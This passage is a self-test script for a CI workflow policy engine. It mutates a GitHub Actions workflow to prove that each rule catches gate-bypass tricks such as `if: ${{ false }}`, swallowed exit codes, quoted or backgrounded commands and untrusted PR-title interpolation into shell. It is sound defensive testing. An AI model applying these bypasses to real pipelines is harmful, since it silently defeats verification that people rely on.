/**
 * Proves the workflow policy rejects what it claims to reject.
 *
 * A policy engine that has only ever been run against a clean file is a policy
 * engine with an unknown pass rate. Each case below mutates the *real* workflow
 * — including `if: ${{ false }}` on `verify`, the exact bypass that failed
 * round 1 of this ticket — and asserts the named rule fires. The unmutated file
 * must come back clean, so the suite also fails if the policy becomes
 * trigger-happy.
 *
 * And every rule the engine declares must have at least one mutation here. That
 * check is the fix for a real round-2 miss: four rules — yaml-parse,
 * no-yaml-anchor, least-privilege, no-stray-condition — had never been mutated,
 * and nothing said so, because coverage was something a human counted. It is
 * now derived from workflow-policy.mjs's own RULES list, so a new rule without
 * a mutation fails this suite on the commit that adds it.
 *
 * ── WHAT A MUTATION HAS TO PROVE (round 5) ──────────────────────────────────
 * Round 4 asserted only that *some* violation carried the target rule id, which
 * three different things satisfy: the violation you meant, a violation about a
 * completely different step of the same rule, and a violation that fires because
 * the mutation broke something else entirely. The round-4 gauntlet found the
 * third kind — two prerequisite mutations that deleted a *required* step, so
 * they went red under `required-job-steps` and would have gone red with
 * `required-step-prerequisites` deleted from the engine. A mutation that passes
 * without its rule is not a test of that rule.
 *
 * So every mutation now declares one of:
 *   - `message`: a regular expression the violation's text must match, which
 *     pins *which instance* fired, not merely which rule;
 *   - `pair`:    for `required-step-prerequisites`, the exact (job, step, needs)
 *     edge, compared against the structured pair the engine attaches to the
 *     violation — identity, not prose.
 * and every mutation is checked for *purity*: the set of rules it trips must be
 * the target rule plus whatever it explicitly declares in `also`, with a written
 * reason. A mutation that fires four rules proves one of them at most.
 *
 * Coverage is derived twice over: once from RULES (every rule has a mutation)
 * and once from PREREQUISITE_PAIRS (every declared pair is named by a mutation).
 *
 *   node scripts/ci/workflow-policy-selftest.mjs [workflow.yml]
 */

// The `${{ ... }}` sequences below are GitHub Actions expression syntax inside
// plain strings, not JavaScript template placeholders. Biome cannot tell the two
// apart, and these mutations have to reproduce the workflow text byte for byte.
// biome-ignore-all lint/suspicious/noTemplateCurlyInString: GitHub Actions expressions, quoted verbatim

import { readFileSync } from 'node:fs';
import { isAbsolute, join } from 'node:path';
import { parse } from 'yaml';
import { checkerGraphProblems } from './checker-graph.mjs';
import { mainGuardProblems } from './guard-scan.mjs';
import { isMainModule } from './main-module.mjs';
import { repoRoot } from './repo-root.mjs';
import { LAUNCHER_NAMES, PACKAGE_MANAGER_NAMES } from './shell-command.mjs';
import {
  checkWorkflowFile,
  DECLARED_VARIABLES,
  PREREQUISITE_PAIRS,
  pairId,
  protectedCommandCoverage,
  RULES,
} from './workflow-policy.mjs';

/**
 * Every path this file reads, resolved against the repository rather than
 * against whoever's working directory happened to be current (#40 round 9, D6).
 *
 * `repo-root.mjs` was written in round 8 for exactly this and this file was not
 * converted: `readFileSync('README.md')` and `mainGuardProblems('scripts')` both
 * meant "relative to cwd", and the README read had a `catch { return []; }`
 * behind it, so from the wrong directory — or with the file deleted — every
 * count claim in the prose went unchecked and this self-test still printed its
 * full total.
 */
const ROOT = repoRoot();
const repoFile = (relative) => (isAbsolute(relative) ? relative : join(ROOT, relative));

const WORKFLOW = process.argv[2] ?? '.github/workflows/ci.yml';

/** Inserts `lines` immediately after the first line containing `anchor`. */
function insertAfter(source, anchor, lines) {
  const rows = source.split('\n');
  const index = rows.findIndex((row) => row.includes(anchor));
  if (index === -1) throw new Error(`mutation anchor not found: ${anchor}`);
  rows.splice(index + 1, 0, ...lines);
  return rows.join('\n');
}

function replaceOnce(source, from, to) {
  if (!source.includes(from)) throw new Error(`mutation target not found: ${from}`);
  return source.replace(from, to);
}

/**
 * The line range of one `- name: …` step, comments above the next step excluded.
 *
 * Prerequisite mutations are about whole steps rather than single lines: the
 * accident being modelled is a rebase dropping a step, or a reorder putting a
 * setup after the thing it sets up, and neither is expressible as a substring
 * edit.
 */
function stepRange(rows, name) {
  const start = rows.findIndex((row) => row.trim() === `- name: ${name}`);
  if (start === -1) throw new Error(`mutation step not found: ${name}`);
  const indent = rows[start].slice(0, rows[start].indexOf('-'));
  let end = start + 1;
  while (end < rows.length) {
    const row = rows[end];
    const isNextStep = row.startsWith(`${indent}- `);
    const isComment = row.startsWith(`${indent}#`);
    const isDedent = row.trim() !== '' && !row.startsWith(indent);
    if (isNextStep || isComment || isDedent) break;
    end += 1;
  }
  // Trailing blank lines belong to the gap, not to the step.
  while (end > start + 1 && rows[end - 1].trim() === '') end -= 1;
  return { start, end };
}

/** Removes a whole step from the workflow, the way a bad rebase would. */
function deleteStep(source, name) {
  const rows = source.split('\n');
  const { start, end } = stepRange(rows, name);
  rows.splice(start, end - start);
  return rows.join('\n');
}

/** Moves a whole step to sit immediately after another one, preserving both. */
function moveStepAfter(source, name, anchor) {
  const rows = source.split('\n');
  const { start, end } = stepRange(rows, name);
  const block = rows.splice(start, end - start);
  const target = stepRange(rows, anchor);
  rows.splice(target.end, 0, ...block);
  return rows.join('\n');
}

/**
 * Guts a step's script while leaving every character of it visible: each command
 * becomes an `echo` of itself.
 *
 * This is the mutation nobody wrote, and the round-4 gauntlet's blocking
 * finding. A step whose entire body is
 *
 *     echo 'git fetch --no-tags --depth=1 origin +refs/heads/main:…'
 *
 * satisfies any rule that asks "does this text appear in the job" while doing
 * nothing at all — and for the ratchet's baseline fetch specifically, doing
 * nothing at all is *green*, because the ratchet's no-baseline path exits 0. So
 * the policy passed and the run passed over a fetch that never happened.
 * Deleting a step is the accident this ticket started with; quoting a step is
 * the same accident with a comment on top, and it is the one a substring matcher
 * cannot see. Every prerequisite gets one of these below.
 */
function decoyStep(source, name) {
  const rows = source.split('\n');
  const { start, end } = stepRange(rows, name);
  const runAt = rows.findIndex(
    (row, index) => index >= start && index < end && /^\s*run:/.test(row),
  );
  if (runAt === -1) throw new Error(`mutation step has no run: script: ${name}`);
  const indent = rows[runAt].slice(0, rows[runAt].search(/\S/));
  const inline = rows[runAt].replace(/^\s*run:\s*/, '');
  const script = [];
  // `run: cmd`, `run: 'cmd'` and `run: |` / `run: >-` followed by a block.
  if (inline !== '' && !/^[|>]/.test(inline)) script.push(inline.replace(/^(['"])(.*)\1$/, '$2'));
  for (let index = runAt + 1; index < end; index += 1) script.push(rows[index].trim());

  const quoted = script
    .filter((line) => line !== '')
    .map((line) => `${indent}  echo '${line.split("'").join(`'\\''`)}'`);
  rows.splice(runAt, end - runAt, `${indent}run: |`, ...quoted);
  return rows.join('\n');
}

/** The real baseline fetch, and the ways of writing it this file rewrites it into. */
const FETCH_RUN =
  '        run: git fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main\n';
const FETCH = 'git fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main';

/** A `run: |` block at the fetch step's indentation. */
function runBlock(lines) {
  return `        run: |\n${lines.map((line) => `          ${line}`).join('\n')}\n`;
}

/** Replaces the baseline fetch step's script, leaving the step itself intact. */
function rewriteFetch(source, lines) {
  return replaceOnce(source, FETCH_RUN, runBlock(lines));
}

/** The two other real lines these fixtures rewrite. */
const LINT_RUN = '        run: pnpm lint\n';
const ENV_LINE = '        run: echo "VITEST_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"\n';

/** An accepted form: one exact line of the real workflow, and what it becomes. */
const rewritesFetch = (...lines) => [FETCH_RUN, runBlock(lines)];

/**
 * Legitimate ways to write a protected command that the policy must NOT reject.
 *
 * ── THE OTHER HALF OF THE ROUND-5 FINDING ───────────────────────────────────
 * Round 5's matcher recognised a command only at the start of a line, so the
 * fetch forms below all read as "the fetch is missing" — verified directly
 * against the round-5 engine, which reports `required-step-prerequisites` on
 * every one of them. None is exotic and none is an evasion: they are a subshell,
 * a conditional list, a one-shot environment variable, three ordinary launchers,
 * `xargs`, a per-invocation `git -c`, and a line long enough to wrap.
 *
 * A guard that is wrong in both directions is worse than the regex it replaced,
 * because a false red is fixed by deleting the rule. So these are fixtures with
 * the opposite polarity to everything else in this file: the mutated workflow
 * must come back *completely clean*, not merely free of one rule.
 */
const ACCEPTED_FORMS = {
  'the fetch behind a one-shot environment variable': rewritesFetch(
    `GIT_TERMINAL_PROMPT=0 ${FETCH}`,
  ),
  'the fetch behind sudo': rewritesFetch(`sudo ${FETCH}`),
  'the fetch behind a timeout': rewritesFetch(`timeout 30 ${FETCH}`),
  'the fetch behind `command`, which bypasses functions and aliases': rewritesFetch(
    `command ${FETCH}`,
  ),
  // Requirement (c) of the launcher allowlist's admission criteria: every entry
  // and every option beside it has a fixture the real workflow must accept
  // completely clean. An allowlist nobody can satisfy is a denylist with extra
  // steps, and these are what stop it drifting into one.
  'the fetch behind sudo as a named user, non-interactively': rewritesFetch(
    `sudo -n -u runner ${FETCH}`,
  ),
  'the fetch behind a timeout with a signal and a kill-after': rewritesFetch(
    `timeout -s TERM -k 5s 30 ${FETCH}`,
  ),
  'the fetch behind `command -p`, which searches the standard PATH': rewritesFetch(
    `command -p ${FETCH}`,
  ),
  // The same requirement for the node-flag allowlist: a diagnostic flag must
  // still read as a real invocation, or the allowlist is a ban on flags.
  'the policy engine run with source maps and no warnings': [
    '        run: node scripts/ci/workflow-policy.mjs .github/workflows\n',
    '        run: node --enable-source-maps --no-warnings scripts/ci/workflow-policy.mjs .github/workflows\n',
  ],
  'the fetch with a per-invocation git config': rewritesFetch(
    `git -c protocol.version=2 fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main`,
  ),
  'the fetch wrapped over a backslash continuation': rewritesFetch(
    'git fetch --no-tags \\',
    '  --depth=1 origin +refs/heads/main:refs/remotes/origin/main',
  ),
  // The tightened $GITHUB_ENV matcher, from the accepting side. Its rejecting
  // side is two mutations below: `$GITHUB_ENV.bak` and `'$GITHUB_ENV'`.
  'the run-start timestamp with braces round the variable': [
    ENV_LINE,
    '        run: echo "VITEST_RUN_START=$(date +%s%3N)" >> "${GITHUB_ENV}"\n',
  ],
  'the run-start timestamp written with printf': [
    ENV_LINE,
    `        run: printf 'VITEST_RUN_START=%s\\n' "$(date +%s%3N)" >> "$GITHUB_ENV"\n`,
  ],
  'the run-start timestamp with the variable unquoted': [
    ENV_LINE,
    '        run: echo "VITEST_RUN_START=$(date +%s%3N)" >> $GITHUB_ENV\n',
  ],
  // An absolute path to the binary is hardening, not evasion, and the first
  // draft of `COMPUTED_BY_DATE` refused it — a false red a blind cross-lineage
  // review measured.
  'the run-start timestamp from an absolute path to date': [
    ENV_LINE,
    '        run: echo "VITEST_RUN_START=$(/usr/bin/date +%s%3N)" >> "$GITHUB_ENV"\n',
  ],
  // ── THE BOUNDARY THAT MOVED (#40 round 7) ────────────────────────────────
  // This slot used to hold `$(date --date=@1748736000 +%s%3N)`, recorded on the
  // *accepting* side as a stated seam: the policy could not tell a clock told
  // what to print from a clock, and `report-file.mjs` would refuse the value at
  // runtime because it is not within a day of now. That argument holds for a
  // literal and fails for the spelling somebody would actually write —
  // `$(date -d -5hours +%s%3N)` is within a day of now on every run, for ever,
  // and it backdates the recorded start past a leftover report's mtime. So the
  // seam moved: the whole `date` argv is an allowlist now, and the three
  // backdating spellings are mutations below. Backticks stay on this side —
  // they are the older spelling of the same substitution and refusing them
  // would be a false red.
  'the run-start timestamp read through a backtick substitution': [
    ENV_LINE,
    '        run: echo "VITEST_RUN_START=`date +%s%3N`" >> "$GITHUB_ENV"\n',
  ],
  // The separate spelling of a flag value, which the option table now *consumes*
  // rather than ignoring. It is here because consuming it is what stops the
  // operand scan reading `1` as the remote — a fix that made this form illegal
  // would have been the false red that gets a rule deleted.
  'the baseline fetch with its depth given as a separate word': rewritesFetch(
    'git fetch --no-tags --depth 1 origin +refs/heads/main:refs/remotes/origin/main',
  ),
  // A package.json script is still one behind a launcher: `sudo` is not what
  // makes `pnpm lint` a lint, so the rule asks what was unwrapped, not argv[0].
  'the linter behind a launcher': [LINT_RUN, '        run: timeout 300 pnpm lint\n'],
  // Requirement (c) for the *manager* table, which round 4 never applied to it.
  // Each entry there and each option beside it has a form the real workflow can
  // be written in that must come back completely clean — otherwise "`--filter`
  // is admissible with `--fail-if-no-match`" is a sentence in a comment rather
  // than a thing the engine does.
  'the schema assertion filtered with the short spelling and the pairing': [
    '        run: pnpm --fail-if-no-match --filter @atrium/db exec node ../../scripts/ci/assert-tables.mjs\n',
    '        run: pnpm --fail-if-no-match -F @atrium/db exec node ../../scripts/ci/assert-tables.mjs\n',
  ],
  'the same with the filter value attached and the pairing after it': [
    '        run: pnpm --fail-if-no-match --filter @atrium/db exec node ../../scripts/ci/assert-tables.mjs\n',
    '        run: pnpm --filter=@atrium/db --fail-if-no-match exec node ../../scripts/ci/assert-tables.mjs\n',
  ],
  // The environment allowlist from the accepting side: a declared variable must
  // still be settable, or the inversion is a ban on `env:`.
  'a declared variable set on a step': [
    LINT_RUN,
    '        env:\n          NODE_VERSION: "22"\n        run: pnpm lint\n',
  ],
  // `runs-on:` from the accepting side. The list form of one label is the same
  // machine written differently, and a rule that refused it would be a false
  // red on a legitimate spelling — which is how rules get deleted. Two labels,
  // or the `{group:…}` object, are still refused.
  'the runner named in the documented list form': [
    '  verify:\n    name: lint · typecheck · test · build\n    runs-on: ubuntu-latest\n',
    '  verify:\n    name: lint · typecheck · test · build\n    runs-on: [ubuntu-latest]\n',
  ],
};

/**
 * Forms that ARE genuine invocations and are still refused on a protected step.
 *
 * ── THE TWO QUESTIONS, KEPT APART (#40 round 3) ─────────────────────────────
 * All four of these were `ACCEPTED_FORMS` until now, and round 6 was right to
 * accept them: each one really does run the fetch, and a matcher that reads them
 * as "the fetch is missing" is wrong in the direction that gets rules deleted.
 * Recognition still accepts them — which is why every mutation below trips
 * `protected-steps-run-one-command` and *nothing else*. That purity is the proof
 * that the presence rules have not moved.
 *
 * They are refused for a different reason. `false && git fetch …` and
 * `true && git fetch …` are the same parse, so the only way to stop a protected
 * step being written so that it does not run is to refuse the shape. The
 * round-2 gauntlet's bypass — `false && node scripts/ci/assert-page-serves.mjs;
 * true` — is a `&&` list with a trailing success, and no parser can draw a
 * principled line between it and `true && git fetch …`. So the line is "one
 * unconditional command", and the cost is these four spellings, each of which
 * has an honest one-command equivalent.
 */
const SHAPE_REJECTED_FORMS = {
  // The option half of the round-4 allowlist, from the rejecting side. `sudo` is
  // permitted and `sudo --background` is not, and the refusal is "that option is
  // not on the list" rather than "that option is `-b`" — which is the difference
  // between closing a spelling and closing a class. `--wow` is deliberately not
  // a real `timeout` flag: an option nobody has justified is refused whether or
  // not it exists, so the next release of coreutils cannot add a bypass.
  'the fetch behind `sudo --background`, the long spelling of the round-3 finding': [
    `sudo --background ${FETCH}`,
  ],
  'the fetch behind a `timeout` option nobody put on the list': [`timeout --wow 30 ${FETCH}`],
  'the fetch behind `setsid -f`': [`setsid -f ${FETCH}`],
  'the fetch inside a subshell': [`(${FETCH})`],
  'the fetch after a `&&` list, which is the bypass with a true guard': [`true && ${FETCH}`],
  'the fetch driven by xargs at the end of a pipeline': [`echo main | xargs -I{} ${FETCH}`],
  'the fetch as the body of a shell function that is then called': [
    'fetch_baseline() {',
    `  ${FETCH}`,
    '}',
    'fetch_baseline',
  ],
};

/**
 * Ways of writing something that *contains* the fetch without running it.
 *
 * Every one of these must break the ratchet's pair and nothing else. The first
 * is the round-5 gauntlet's blocking finding applied to a prerequisite: the
 * round-5 matcher allowed arbitrary text between a package manager and a later
 * `exec`, so `echo exec` in the middle satisfied it. Verified against the
 * round-5 engine: clean, on every one of these except the `echo` decoy it
 * already caught.
 */
const REJECTED_FORMS = {
  'the fetch behind a fake `exec`, the round-5 bypass': [`pnpm --version && echo exec ${FETCH}`],
  'the fetch backgrounded, so nothing waits for it': [`${FETCH} &`],
  'the fetch backgrounded inside a subshell': [`(${FETCH}) &`],
  'the fetch quoted into an echo': [`echo '${FETCH}'`],
  'the fetch in a here-document, which is data and not script': [
    "cat <<'EOF' > /dev/null",
    FETCH,
    'EOF',
  ],
  'the fetch commented out': ['true', `# ${FETCH}`],
  'a word between the package manager and its exec': [`pnpm install exec ${FETCH}`],
  'the fetch looked up rather than run': [`command -v ${FETCH}`],
};

/**
 * The nine declared (step → prerequisite) edges, by hand here and cross-checked
 * against `PREREQUISITE_PAIRS` in `main()`. Naming them makes a prerequisite
 * mutation assert *which* pair it broke rather than that some pair broke.
 */
const PAIRS = {
  ratchetNeedsFetch: {
    job: 'verify',
    step: 'the floor-ratchet assertion',
    needs: 'the fetch of the baseline manifest from main',
  },
  migrationsNeedPostgres: {
    job: 'verify',
    step: 'the migrations',
    needs: 'the wait for Postgres',
  },
  schemaNeedsMigrations: {
    job: 'verify',
    step: 'the schema set-equality assertion',
    needs: 'the migrations',
  },
  suiteNeedsReset: {
    job: 'verify',
    step: 'the unit/integration suite',
    needs: 'the step that deletes the vitest reports and records VITEST_RUN_START',
  },
  vitestGateNeedsSuite: {
    job: 'verify',
    step: 'the vitest report gate',
    needs: 'the unit/integration suite',
  },
  chromiumNeedsInstall: {
    job: 'e2e',
    step: 'the browser-presence assertion',
    needs: 'the Chromium install',
  },
  e2eSuiteNeedsReset: {
    job: 'e2e',
    step: 'the Playwright suite',
    needs: 'the step that deletes the e2e report and records E2E_RUN_START',
  },
  e2eSuiteNeedsChromium: {
    job: 'e2e',
    step: 'the Playwright suite',
    needs: 'the browser-presence assertion',
  },
  e2eGateNeedsSuite: {
    job: 'e2e',
    step: 'the e2e report gate',
    needs: 'the Playwright suite',
  },
  e2eSuiteNeedsMigration: {
    job: 'e2e',
    step: 'the Playwright suite',
    needs: 'the e2e database migration',
  },

  // ---- the deployment job (#40) -------------------------------------------
  bootNeedsBuild: {
    job: 'deploy',
    step: 'the stack boot',
    needs: 'the image build',
  },
  bootNeedsPreflight: {
    job: 'deploy',
    step: 'the stack boot',
    needs: 'the deployment preflight',
  },
  recordNeedsBuild: {
    job: 'deploy',
    step: 'the image record',
    needs: 'the image build',
  },
  identityNeedsRecord: {
    job: 'deploy',
    step: 'the image-identity assertion',
    needs: 'the image record',
  },
  identityNeedsBoot: {
    job: 'deploy',
    step: 'the image-identity assertion',
    needs: 'the stack boot',
  },
  imageOriginsNeedsRecord: {
    job: 'deploy',
    step: 'the compiled-origin assertion',
    needs: 'the image record',
  },
  caNeedsBoot: {
    job: 'deploy',
    step: 'the certificate-authority copy',
    needs: 'the stack boot',
  },
  healthNeedsBoot: {
    job: 'deploy',
    step: 'the container-health assertion',
    needs: 'the stack boot',
  },
  configNeedsBoot: {
    job: 'deploy',
    step: 'the production-configuration assertion',
    needs: 'the stack boot',
  },
  imageOriginsNeedsBuild: {
    job: 'deploy',
    step: 'the compiled-origin assertion',
    needs: 'the image build',
  },
  pageNeedsCa: {
    job: 'deploy',
    step: 'the real-page assertion',
    needs: 'the certificate-authority copy',
  },
  signupNeedsCa: {
    job: 'deploy',
    step: 'the signup-and-verification assertion',
    needs: 'the certificate-authority copy',
  },
  wsNeedsCa: {
    job: 'deploy',
    step: 'the websocket-upgrade assertion',
    needs: 'the certificate-authority copy',
  },
  rateLimitNeedsCa: {
    job: 'deploy',
    step: 'the per-address rate-limit assertion',
    needs: 'the certificate-authority copy',
  },
  teardownAssertionNeedsTeardown: {
    job: 'deploy',
    step: 'the teardown assertion',
    needs: 'the teardown',
  },
  migrationImageNeedsRecord: {
    job: 'deploy',
    step: 'the migration-image assertion',
    needs: 'the image record',
  },
  bootNeedsMigrationImage: {
    job: 'deploy',
    step: 'the stack boot',
    needs: 'the migration-image assertion',
  },
  schemaNeedsBoot: {
    job: 'deploy',
    step: 'the composed-stack schema assertion',
    needs: 'the stack boot',
  },
  pageNeedsSignup: {
    job: 'deploy',
    step: 'the real-page assertion',
    needs: 'the signup-and-verification assertion',
  },
  suiteNeedsDelete: {
    job: 'verify',
    step: 'the unit/integration suite',
    needs: 'the step that deletes the vitest reports',
  },
  e2eSuiteNeedsDelete: {
    job: 'e2e',
    step: 'the Playwright suite',
    needs: 'the step that deletes the e2e report',
  },
};

/** Where a violation says it is: `jobs.<job>.steps.<n>.<key>`. */
function stepPath(job, key) {
  return new RegExp(String.raw`jobs\.${job}\.steps\.\d+\.${key}\b`);
}

const MUTATIONS = [
  {
    name: 'a step allowed to fail',
    rule: 'no-continue-on-error',
    mutate: (s) => insertAfter(s, '      - name: Lint', ['        continue-on-error: true']),
    message: stepPath('verify', 'continue-on-error'),
  },
  {
    name: 'the round-1 bypass: if: ${{ false }} on the verify job',
    rule: 'no-job-condition',
    mutate: (s) => replaceOnce(s, '  verify:\n', '  verify:\n    if: ${{ false }}\n'),
    message: /`if: \$\{\{ false \}\}` on job `verify`/,
  },
  {
    name: 'a job condition dressed up as an event check',
    rule: 'no-job-condition',
    mutate: (s) =>
      replaceOnce(s, '  e2e:\n', "  e2e:\n    if: github.event_name != 'pull_request'\n"),
    message: /on job `e2e`/,
  },
  {
    name: 'a quoted key, which grep reads as a different key',
    rule: 'no-continue-on-error',
    mutate: (s) => insertAfter(s, '      - name: Typecheck', ['        "continue-on-error": true']),
    message: stepPath('verify', 'continue-on-error'),
  },
  {
    name: 'a shell override that can drop -e',
    rule: 'no-shell-override',
    mutate: (s) => insertAfter(s, '      - name: Build', ['        shell: bash {0}']),
    message: /`shell: bash \{0\}`/,
  },
  {
    name: 'a step-level timeout that can mask a hung suite',
    rule: 'no-step-timeout',
    mutate: (s) =>
      insertAfter(s, '      - name: Unit + integration tests', ['        timeout-minutes: 1']),
    message: stepPath('verify', 'timeout-minutes'),
  },
  {
    name: 'a condition on a step that is not an artifact upload',
    rule: 'no-step-condition',
    mutate: (s) => insertAfter(s, '      - name: Build', ['        if: success()']),
    message: /`if: success\(\)` at jobs\.verify\.steps\.\d+\.if/,
  },
  {
    name: 'an always() condition smuggled onto a gate step',
    rule: 'no-step-condition',
    mutate: (s) =>
      insertAfter(s, '      - name: Assert the suite actually ran', ['        if: always()']),
    message: /`if: always\(\)` at jobs\.verify\.steps\.\d+\.if/,
  },
  {
    name: 'a swallowed exit code',
    rule: 'no-fail-open-shell',
    mutate: (s) => replaceOnce(s, '        run: pnpm lint\n', '        run: pnpm lint || true\n'),
    message: /`\|\| true` in the script at jobs\.verify\.steps\.\d+\.run/,
    // `pnpm lint` is a protected step, and `|| true` is two commands joined by a
    // control operator — which is the shape rule's entire subject. Both rules
    // are right about it, and each would still catch it with the other gone.
    also: ['protected-steps-run-one-command'],
  },
  {
    name: 'an action unpinned back to a mutable tag',
    rule: 'pin-actions-to-sha',
    mutate: (s) =>
      replaceOnce(
        s,
        'uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1',
        'uses: actions/checkout@v7',
      ),
    message: /`uses: actions\/checkout@v7` is not pinned to a 40-character commit SHA/,
  },
  {
    name: 'a SHA pin with no record of which release it is',
    rule: 'pin-actions-to-sha',
    mutate: (s) =>
      replaceOnce(
        s,
        'uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0',
        'uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9',
      ),
    message: /`uses: actions\/cache@[0-9a-f]{40}` needs a trailing `# vN\.N\.N` comment/,
  },
  {
    name: 'a new job the gate does not cover',
    rule: 'gate-covers-all-jobs',
    mutate: (s) =>
      `${s}\n  publish:\n    name: publish\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n      - name: Ship it\n        run: echo shipping\n`,
    message: /job\(s\) `publish` are not in `gate\.needs`/,
  },
  {
    name: 'the gate losing always()',
    rule: 'gate-runs-always',
    mutate: (s) =>
      replaceOnce(
        s,
        '    needs: [verify, e2e, deploy]\n    if: always()\n',
        '    needs: [verify, e2e, deploy]\n',
      ),
    message: /`gate` must declare `if: always\(\)`/,
  },
  {
    name: 'the gate quietly dropping a job from needs',
    rule: 'gate-covers-all-jobs',
    mutate: (s) => replaceOnce(s, '    needs: [verify, e2e, deploy]', '    needs: [verify]'),
    message: /job\(s\) `e2e`, `deploy` are not in `gate\.needs`/,
  },
  {
    name: 'the gate no longer reading the results it needs',
    rule: 'gate-inspects-needs',
    mutate: (s) => replaceOnce(s, 'NEEDS: ${{ toJSON(needs) }}', 'NEEDS: nothing-to-see-here'),
    message: /no step in `gate` binds `\$\{\{ toJSON\(needs\) \}\}`/,
  },
  {
    name: 'the merge_group trigger removed, so a merge queue never reports',
    rule: 'required-triggers',
    mutate: (s) => replaceOnce(s, '  merge_group:\n', ''),
    message: /missing the `merge_group` trigger/,
  },
  {
    name: 'a job with no timeout, which can hang forever without reporting',
    rule: 'job-timeout-required',
    mutate: (s) =>
      replaceOnce(
        s,
        '    runs-on: ubuntu-latest\n    timeout-minutes: 20\n',
        '    runs-on: ubuntu-latest\n',
      ),
    message: /job `verify` has no `timeout-minutes`/,
  },
  {
    name: 'untrusted PR text interpolated into a shell script',
    rule: 'no-untrusted-interpolation',
    // On its own line rather than `echo … && pnpm build`, so the build is still
    // in command position and this mutation tests one rule. See COMMAND_POSITION
    // in workflow-policy.mjs: a command is recognised at the start of a line and
    // nowhere else, which is what makes `echo 'git fetch …'` inert to the engine.
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: pnpm build\n',
        '        run: |\n          echo "${{ github.event.pull_request.title }}"\n          pnpm build\n',
      ),
    message: /attacker-controllable `github\.event` context interpolated/,
    // Two lines is two commands, and `pnpm build` is protected. Putting the echo
    // in an unprotected step would test the interpolation rule in isolation and
    // stop modelling the accident, so the collateral is declared instead.
    also: ['protected-steps-run-one-command'],
  },
  {
    name: 'a YAML alias hiding a construct from a line-oriented reader',
    rule: 'no-yaml-alias',
    mutate: (s) =>
      replaceOnce(
        replaceOnce(s, 'permissions:\n  contents: read', 'permissions: &perms\n  contents: read'),
        '  verify:\n',
        '  verify:\n    permissions: *perms\n',
      ),
    message: /YAML alias \*perms/,
    // An alias cannot exist without the anchor it points at; writing one
    // necessarily writes the other. The anchor rule has its own mutation below.
    also: ['no-yaml-anchor'],
  },

  // ---- the four rules round 2 never mutated -------------------------------
  {
    name: 'a workflow that is not valid YAML at all',
    rule: 'yaml-parse',
    mutate: (s) => replaceOnce(s, 'name: CI\n', 'name: [CI\n'),
    message: /is not valid YAML/,
  },
  {
    name: 'a YAML anchor, whose expansion a human reading the file never sees',
    rule: 'no-yaml-anchor',
    mutate: (s) =>
      replaceOnce(s, 'permissions:\n  contents: read', 'permissions: &perms\n  contents: read'),
    message: /YAML anchor &perms/,
  },
  {
    name: 'the workflow handing every job write access it never asked for',
    rule: 'least-privilege',
    mutate: (s) =>
      replaceOnce(s, 'permissions:\n  contents: read', 'permissions:\n  contents: write'),
    message: /workflow-level `permissions:` must declare `contents: read`/,
  },
  {
    name: 'a condition somewhere a condition does not belong',
    rule: 'no-stray-condition',
    mutate: (s) =>
      replaceOnce(
        s,
        'permissions:\n  contents: read',
        'if: always()\npermissions:\n  contents: read',
      ),
    message: /`if: always\(\)` at if, which is not a place a condition belongs/,
  },

  // ---- the rules round 3 adds ---------------------------------------------
  {
    name: 'the policy step deleted, so the policy stops objecting to anything',
    rule: 'policy-steps-present',
    mutate: (s) =>
      replaceOnce(s, '        run: node scripts/ci/workflow-policy.mjs .github/workflows\n', ''),
    message: /never runs the workflow policy engine/,
  },
  {
    name: "the policy's own self-test deleted, so a policy that stopped firing looks fine",
    rule: 'policy-steps-present',
    mutate: (s) =>
      replaceOnce(s, '        run: node scripts/ci/workflow-policy-selftest.mjs\n', ''),
    message: /never runs the policy engine's own self-test/,
  },
  {
    name: 'actionlint quietly dropped',
    rule: 'policy-steps-present',
    mutate: (s) =>
      replaceOnce(
        s,
        `        run: '"$RUNNER_TEMP/actionlint" -color'\n`,
        '        run: echo skipped\n',
      ),
    message: /never runs actionlint/,
  },
  {
    name: 'actionlint downloaded and never run — the shape this rule is looking for',
    rule: 'policy-steps-present',
    mutate: (s) => decoyStep(s, 'Lint workflows with actionlint'),
    message: /never runs actionlint/,
  },
  {
    name: 'the gate self-test deleted, so a gate that stopped catching things looks fine',
    rule: 'policy-steps-present',
    mutate: (s) => replaceOnce(s, '        run: node scripts/ci/gate-selftest.mjs\n', ''),
    message: /never runs the test gates' self-test/,
  },
  // ---- the positive control over both self-tests (#40 round 8, D3) --------
  // The two self-tests above report green, and nothing in either distinguishes
  // "green because the tree is clean" from "green because the file was
  // silenced". On r7, one statement one line above each one's guard left both at
  // exit=0 with no output under CI, with every other gate clean.
  {
    name: 'the positive control over the self-tests deleted',
    rule: 'policy-steps-present',
    mutate: (s) => replaceOnce(s, '        run: node scripts/ci/positive-control.mjs verify\n', ''),
    message: /never runs the positive control over both self-tests/,
  },
  {
    name: 'the positive control kept but pointed at a group that does not exist',
    rule: 'policy-steps-present',
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: node scripts/ci/positive-control.mjs verify\n',
        '        run: node scripts/ci/positive-control.mjs nothing\n',
      ),
    message: /never runs the positive control over both self-tests/,
  },
  {
    name: 'the positive control over the stack assertions deleted',
    rule: 'required-job-steps',
    mutate: (s) => replaceOnce(s, '        run: node scripts/ci/positive-control.mjs deploy\n', ''),
    message: /never runs the positive control over the stack assertions/,
  },
  {
    name: 'the test suite removed from verify, leaving a job that lints and calls it a day',
    rule: 'required-job-steps',
    mutate: (s) => replaceOnce(s, '          pnpm vitest run\n', '          echo no tests today\n'),
    message: /never runs the unit\/integration suite/,
    // Deleting the run also orphans the gate that reads its report: the report
    // gate is still there, and now nothing produced the report it asserts on.
    also: ['required-step-prerequisites'],
  },
  {
    name: 'the vitest report gate removed while the suite still runs',
    rule: 'required-job-steps',
    mutate: (s) => replaceOnce(s, '        run: node scripts/ci/assert-vitest-report.mjs\n', ''),
    message: /never runs the vitest report gate/,
  },
  {
    name: 'the floor ratchet removed, so lowering a floor becomes free again',
    rule: 'required-job-steps',
